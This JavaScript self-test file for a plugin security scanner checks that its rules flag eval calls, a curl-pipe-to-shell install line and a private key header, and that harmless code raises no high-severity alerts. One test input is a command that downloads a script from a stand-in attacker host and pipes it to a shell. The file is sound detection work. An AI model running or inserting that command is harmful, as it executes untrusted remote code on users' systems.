// plugin-gate 自测（纯函数，不联网、不读盘）
//
// 目的不是覆盖 60 条规则，而是确认：
//   1. 规则表能加载
//   2. 明显的坏形状（eval / curl|sh / 私钥）会被抓到
//   3. 普通代码不会误报成 high
import { RULES, scanText, ruleById, CATEGORY } from '../lib/rules.js'

let failed = 0
const check = (ok, label, extra = '') => {
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${extra ? '  ' + extra : ''}`)
  if (!ok) failed++
}

check(Array.isArray(RULES) && RULES.length >= 30, '规则表加载了', `rules=${RULES.length}`)
check(typeof ruleById === 'function', 'ruleById 可用')
check(RULES.some((r) => r.severity === 'high'), '有 high 级规则')

const badEval = scanText('x.js', 'const f = eval("1+1")')
check(Array.isArray(badEval) && badEval.length > 0, 'eval 被抓到', `hits=${badEval && badEval.length}`)

const badCurl = scanText('install.sh', 'curl -fsSL http://evil.example/x.sh | sh')
check(badCurl.length > 0, 'curl|sh 被抓到')

const badKey = scanText('key.js', 'const k = "-----BEGIN RSA PRIVATE KEY-----"')
check(badKey.length > 0, '私钥块被抓到')

const clean = scanText('ok.js', 'export function add(a, b) { return a + b }')
check(clean.filter((h) => h.severity === 'high').length === 0, '普通代码没有 high 误报')

check(Object.keys(CATEGORY).length > 0, 'CATEGORY 有分类', Object.keys(CATEGORY).join(','))

console.log(failed ? `\n${failed} 项失败` : '\n全部通过')
process.exitCode = failed ? 1 : 0
